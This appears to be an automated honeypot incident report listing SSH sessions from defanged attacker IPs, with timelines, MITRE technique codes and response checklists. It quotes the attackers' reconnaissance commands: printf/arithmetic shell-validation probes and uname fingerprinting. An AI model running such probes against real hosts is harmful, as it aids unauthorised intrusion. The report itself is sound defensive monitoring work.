| `2026-10-27 02:43:18` | `cowrie.session.connect` |
| `2026-10-27 02:43:19` | `cowrie.client.version` |
| `2026-10-27 02:43:19` | `cowrie.client.kex` |
| `2026-10-27 02:43:23` | `cowrie.login.success` |
| `2026-10-27 02:43:26` | `cowrie.client.size` |
| `2026-10-27 02:43:26` | `cowrie.session.params` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| `2026-10-27 02:43:28` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50be1b248a95

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 02:46 |
| **Last Seen** | 2026-10-27 02:50 |
| **Session Duration** | 225s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c4446cc0aec76c70c211539aa7920b10_small_control'"'"' '"'"'check_c4446cc0aec76c70c211539aa7920b10'"'"'', printf '\n%s|%s\n' 'check_c4446cc0aec76c70c211539aa7920b10_small_control' 'check_c4446cc0aec76c70c211539aa7920b10', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c4446cc0aec76c70c211539aa7920b10_small_math'"'"' "$((395*93+96))"', (395*93+96, printf '\n%s|%s\n' 'check_c4446cc0aec76c70c211539aa7920b10_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:46:31` | `cowrie.session.connect` |
| `2026-10-27 02:46:32` | `cowrie.client.version` |
| `2026-10-27 02:46:32` | `cowrie.client.kex` |
| `2026-10-27 02:46:38` | `cowrie.login.success` |
| `2026-10-27 02:46:43` | `cowrie.client.size` |
| `2026-10-27 02:46:44` | `cowrie.session.params` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| `2026-10-27 02:46:46` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74dae51a0a9e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 02:50 |
| **Last Seen** | 2026-10-27 02:50 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_72daae65f9e1481d5a42a8dfb31fbaba_small_control'"'"' '"'"'check_72daae65f9e1481d5a42a8dfb31fbaba'"'"'', printf '\n%s|%s\n' 'check_72daae65f9e1481d5a42a8dfb31fbaba_small_control' 'check_72daae65f9e1481d5a42a8dfb31fbaba', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_72daae65f9e1481d5a42a8dfb31fbaba_small_math'"'"' "$((490*51+12))"', (490*51+12, printf '\n%s|%s\n' 'check_72daae65f9e1481d5a42a8dfb31fbaba_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:50:16` | `cowrie.session.connect` |
| `2026-10-27 02:50:18` | `cowrie.client.version` |
| `2026-10-27 02:50:18` | `cowrie.client.kex` |
| `2026-10-27 02:50:27` | `cowrie.login.success` |
| `2026-10-27 02:50:33` | `cowrie.client.size` |
| `2026-10-27 02:50:35` | `cowrie.session.params` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| `2026-10-27 02:50:37` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f149aae5a3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 02:56 |
| **Last Seen** | 2026-10-27 02:57 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1f5a179ea90ebfdaa95db836e75e80d1_small_control'"'"' '"'"'check_1f5a179ea90ebfdaa95db836e75e80d1'"'"'', printf '\n%s|%s\n' 'check_1f5a179ea90ebfdaa95db836e75e80d1_small_control' 'check_1f5a179ea90ebfdaa95db836e75e80d1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1f5a179ea90ebfdaa95db836e75e80d1_small_math'"'"' "$((51*101+73))"', (51*101+73, printf '\n%s|%s\n' 'check_1f5a179ea90ebfdaa95db836e75e80d1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:56:29` | `cowrie.session.connect` |
| `2026-10-27 02:56:31` | `cowrie.client.version` |
| `2026-10-27 02:56:31` | `cowrie.client.kex` |
| `2026-10-27 02:56:46` | `cowrie.login.success` |
| `2026-10-27 02:56:54` | `cowrie.client.size` |
| `2026-10-27 02:56:57` | `cowrie.session.params` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| `2026-10-27 02:56:58` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce2051df0f3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 02:59 |
| **Last Seen** | 2026-10-27 03:04 |
| **Session Duration** | 278s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_88cd2b37ee94a804c9f1d012c22449d1_small_control'"'"' '"'"'check_88cd2b37ee94a804c9f1d012c22449d1'"'"'', printf '\n%s|%s\n' 'check_88cd2b37ee94a804c9f1d012c22449d1_small_control' 'check_88cd2b37ee94a804c9f1d012c22449d1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_88cd2b37ee94a804c9f1d012c22449d1_small_math'"'"' "$((127*163+5))"', (127*163+5, printf '\n%s|%s\n' 'check_88cd2b37ee94a804c9f1d012c22449d1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 02:59:58` | `cowrie.session.connect` |
| `2026-10-27 03:00:00` | `cowrie.client.version` |
| `2026-10-27 03:00:00` | `cowrie.client.kex` |
| `2026-10-27 03:00:07` | `cowrie.login.success` |
| `2026-10-27 03:00:11` | `cowrie.client.size` |
| `2026-10-27 03:00:13` | `cowrie.session.params` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| `2026-10-27 03:00:16` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f4e47d908f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 03:04 |
| **Last Seen** | 2026-10-27 03:08 |
| **Session Duration** | 230s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6363c2b252c8e685269ec7710427f318_small_control'"'"' '"'"'check_6363c2b252c8e685269ec7710427f318'"'"'', printf '\n%s|%s\n' 'check_6363c2b252c8e685269ec7710427f318_small_control' 'check_6363c2b252c8e685269ec7710427f318', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6363c2b252c8e685269ec7710427f318_small_math'"'"' "$((519*293+30))"', (519*293+30, printf '\n%s|%s\n' 'check_6363c2b252c8e685269ec7710427f318_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:04:37` | `cowrie.session.connect` |
| `2026-10-27 03:04:38` | `cowrie.client.version` |
| `2026-10-27 03:04:38` | `cowrie.client.kex` |
| `2026-10-27 03:05:08` | `cowrie.login.success` |
| `2026-10-27 03:05:14` | `cowrie.client.size` |
| `2026-10-27 03:05:16` | `cowrie.session.params` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| `2026-10-27 03:05:17` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d587008e19b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 03:08 |
| **Last Seen** | 2026-10-27 03:11 |
| **Session Duration** | 203s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dacb66c330806254d01b1eccfc428344_small_control'"'"' '"'"'check_dacb66c330806254d01b1eccfc428344'"'"'', printf '\n%s|%s\n' 'check_dacb66c330806254d01b1eccfc428344_small_control' 'check_dacb66c330806254d01b1eccfc428344', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dacb66c330806254d01b1eccfc428344_small_math'"'"' "$((180*542+43))"', (180*542+43, printf '\n%s|%s\n' 'check_dacb66c330806254d01b1eccfc428344_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:08:28` | `cowrie.session.connect` |
| `2026-10-27 03:08:28` | `cowrie.client.version` |
| `2026-10-27 03:08:28` | `cowrie.client.kex` |
| `2026-10-27 03:08:29` | `cowrie.login.success` |
| `2026-10-27 03:08:30` | `cowrie.client.size` |
| `2026-10-27 03:08:30` | `cowrie.session.params` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| `2026-10-27 03:08:31` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4a86f48324a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]146` |
| **First Seen** | 2026-10-27 03:08 |
| **Last Seen** | 2026-10-27 03:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:08:29` | `cowrie.session.connect` |
| `2026-10-27 03:08:29` | `cowrie.client.version` |
| `2026-10-27 03:08:29` | `cowrie.client.kex` |
| `2026-10-27 03:08:34` | `cowrie.login.success` |
| `2026-10-27 03:08:37` | `cowrie.session.params` |
| `2026-10-27 03:08:37` | `cowrie.command.input` |
| `2026-10-27 03:08:39` | `cowrie.log.closed` |
| `2026-10-27 03:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]146` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e49c3e6a02

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 03:11 |
| **Last Seen** | 2026-10-27 03:12 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_860eba7a2d04e293be46e9f910e9dfaa_small_control'"'"' '"'"'check_860eba7a2d04e293be46e9f910e9dfaa'"'"'', printf '\n%s|%s\n' 'check_860eba7a2d04e293be46e9f910e9dfaa_small_control' 'check_860eba7a2d04e293be46e9f910e9dfaa', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_860eba7a2d04e293be46e9f910e9dfaa_small_math'"'"' "$((421*171+78))"', (421*171+78, printf '\n%s|%s\n' 'check_860eba7a2d04e293be46e9f910e9dfaa_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:11:52` | `cowrie.session.connect` |
| `2026-10-27 03:11:54` | `cowrie.client.version` |
| `2026-10-27 03:11:54` | `cowrie.client.kex` |
| `2026-10-27 03:11:59` | `cowrie.login.success` |
| `2026-10-27 03:12:03` | `cowrie.client.size` |
| `2026-10-27 03:12:06` | `cowrie.session.params` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| `2026-10-27 03:12:08` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d942639e8bb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 03:12 |
| **Last Seen** | 2026-10-27 03:12 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:12:24` | `cowrie.session.connect` |
| `2026-10-27 03:12:26` | `cowrie.client.version` |
| `2026-10-27 03:12:26` | `cowrie.client.kex` |
| `2026-10-27 03:12:38` | `cowrie.login.success` |
| `2026-10-27 03:12:42` | `cowrie.client.size` |
| `2026-10-27 03:12:55` | `cowrie.session.params` |
| `2026-10-27 03:12:56` | `cowrie.log.closed` |
| `2026-10-27 03:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b97bf9d5502

| Field | Detail |
|---|---|
| **Source IP** | `205.185.118[.]115` |
| **First Seen** | 2026-10-27 03:13 |
| **Last Seen** | 2026-10-27 03:14 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:13:35` | `cowrie.session.connect` |
| `2026-10-27 03:13:39` | `cowrie.client.version` |
| `2026-10-27 03:13:39` | `cowrie.client.kex` |
| `2026-10-27 03:14:14` | `cowrie.login.success` |
| `2026-10-27 03:14:32` | `cowrie.session.params` |
| `2026-10-27 03:14:32` | `cowrie.command.input` |
| `2026-10-27 03:14:36` | `cowrie.log.closed` |
| `2026-10-27 03:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.185.118[.]115` to AbuseIPDB if not already reported
- [ ] Block `205.185.118[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92eecbaa1ed

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-10-27 03:14 |
| **Last Seen** | 2026-10-27 03:17 |
| **Session Duration** | 198s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_26a823396c164645891d559a7736996c_small_control'"'"' '"'"'check_26a823396c164645891d559a7736996c'"'"'', printf '\n%s|%s\n' 'check_26a823396c164645891d559a7736996c_small_control' 'check_26a823396c164645891d559a7736996c', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_26a823396c164645891d559a7736996c_small_math'"'"' "$((924*99+3))"', (924*99+3, printf '\n%s|%s\n' 'check_26a823396c164645891d559a7736996c_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-27 03:14:39` | `cowrie.session.connect` |
| `2026-10-27 03:14:41` | `cowrie.client.version` |
| `2026-10-27 03:14:41` | `cowrie.client.kex` |
| `2026-10-27 03:14:48` | `cowrie.login.success` |
| `2026-10-27 03:14:53` | `cowrie.client.size` |
| `2026-10-27 03:14:54` | `cowrie.session.params` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| `2026-10-27 03:14:55` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (307) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-fb506a9f216f | HIGH | `2.57.122[.]168` | 2026-10-27 03:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e8cdeb944afb | HIGH | `2.57.122[.]168` | 2026-10-27 03:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8bd6c025c75b | HIGH | `2.57.122[.]168` | 2026-10-27 03:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-99f17624b1b9 | HIGH | `2.57.122[.]238` | 2026-10-27 03:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e1acdfe64cec | HIGH | `124.174.39[.]136` | 2026-10-27 03:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d4bcc6c0cdb1 | HIGH | `34.76.152[.]98` | 2026-10-27 03:40 | Y | 2 | 0 | `T1078` |
| IR-697438ccc0e2 | HIGH | `124.174.39[.]136` | 2026-10-27 03:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55cb7b770919 | HIGH | `85.24.223[.]224` | 2026-10-27 03:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4c9b0b566f5b | HIGH | `85.24.223[.]224` | 2026-10-27 03:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-97b0ebe284b3 | HIGH | `34.76.152[.]98` | 2026-10-27 03:40 | Y | 1 | 0 | `T1078` |
| IR-4df3c572a73b | HIGH | `34.76.152[.]98` | 2026-10-27 03:40 | Y | 0 | 0 | `T1078` |
| IR-158119b5e132 | HIGH | `103.191.14[.]243` | 2026-10-27 03:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e09db59e67e4 | HIGH | `103.191.14[.]243` | 2026-10-27 03:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-493c1f990559 | HIGH | `61.220.235[.]10` | 2026-10-27 03:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc9fe7aa11f4 | HIGH | `61.220.235[.]10` | 2026-10-27 03:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2d7fe5b23598 | HIGH | `128.201.9[.]152` | 2026-10-27 03:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05be7cddbc72 | HIGH | `128.201.9[.]152` | 2026-10-27 03:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d85aa357e0ef | HIGH | `109.160.32[.]146` | 2026-10-27 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f793158cc714 | HIGH | `164.30.17[.]82` | 2026-10-27 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-64bef9b5d4e0 | HIGH | `2.57.122[.]238` | 2026-10-27 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ffbc3673ba6b | HIGH | `207.175.21[.]206` | 2026-10-27 04:04 | Y | 2 | 0 | `T1078` |
| IR-fe259ccea739 | HIGH | `207.175.21[.]206` | 2026-10-27 04:04 | Y | 1 | 0 | `T1078` |
| IR-d1a34c5ea677 | HIGH | `207.175.21[.]206` | 2026-10-27 04:04 | Y | 0 | 0 | `T1078` |
| IR-44562e8f0fda | HIGH | `34.79.254[.]110` | 2026-10-27 04:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5803b89911b1 | HIGH | `2.57.122[.]209` | 2026-10-27 04:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e0eb408d0830 | HIGH | `2.57.122[.]209` | 2026-10-27 04:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-be790dde4e60 | HIGH | `176.53.159[.]196` | 2026-10-27 04:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b90ce319c6c6 | HIGH | `104.155.49[.]21` | 2026-10-27 04:44 | Y | 2 | 0 | `T1078` |
| IR-60e81078ef62 | HIGH | `104.155.49[.]21` | 2026-10-27 04:44 | Y | 1 | 0 | `T1078` |
| IR-b08219c18ecc | HIGH | `104.155.49[.]21` | 2026-10-27 04:44 | Y | 0 | 0 | `T1078` |
| IR-3a1399e3fa94 | HIGH | `2.57.122[.]209` | 2026-10-27 04:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4aa5e36e4c7c | HIGH | `2.57.122[.]209` | 2026-10-27 04:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7ce4e0a07ce4 | HIGH | `80.94.95[.]118` | 2026-10-27 04:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ffa178ca1b0 | HIGH | `152.89.12[.]101` | 2026-10-27 04:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2f50fdd59890 | HIGH | `152.89.12[.]101` | 2026-10-27 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1accde60b413 | HIGH | `185.225.41[.]192` | 2026-10-27 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-17cfd5fd5024 | HIGH | `185.225.41[.]192` | 2026-10-27 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c43d1a23377b | HIGH | `129.121.142[.]157` | 2026-10-27 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8734291a1c78 | HIGH | `129.121.142[.]157` | 2026-10-27 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0c27dc34743e | HIGH | `129.121.123[.]73` | 2026-10-27 05:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-54aaaabb1438 | HIGH | `129.121.123[.]73` | 2026-10-27 05:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1b76eb89cd29 | HIGH | `165.154.193[.]219` | 2026-10-27 05:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-611282e56e24 | HIGH | `165.154.193[.]219` | 2026-10-27 05:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9086984c17cf | HIGH | `203.192.232[.]180` | 2026-10-27 05:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cfcd9b1d0374 | HIGH | `203.192.232[.]180` | 2026-10-27 05:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a552408eadb8 | HIGH | `59.97.21[.]114` | 2026-10-27 05:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-befc68c9fa32 | HIGH | `59.97.21[.]114` | 2026-10-27 05:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e1608f262009 | HIGH | `152.42.223[.]6` | 2026-10-27 05:14 | Y | 37 | 9 | `T1078 · T1105` |
| IR-164438e984c1 | HIGH | `179.63.15[.]109` | 2026-10-27 05:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e81796ba6b8d | HIGH | `179.63.15[.]109` | 2026-10-27 05:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89d033b5e21e | HIGH | `193.112.192[.]91` | 2026-10-27 05:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf831025bf0f | HIGH | `101.96.196[.]243` | 2026-10-27 05:19 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-b90100fcd99f | HIGH | `101.96.196[.]243` | 2026-10-27 05:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a61c54f1bd49 | HIGH | `138.226.239[.]233` | 2026-10-27 05:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1349b75229b8 | HIGH | `202.215.132[.]212` | 2026-10-27 05:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b6c7f50116f7 | HIGH | `202.215.132[.]212` | 2026-10-27 05:47 | Y | 0 | 0 | `T1078 · T1592` |
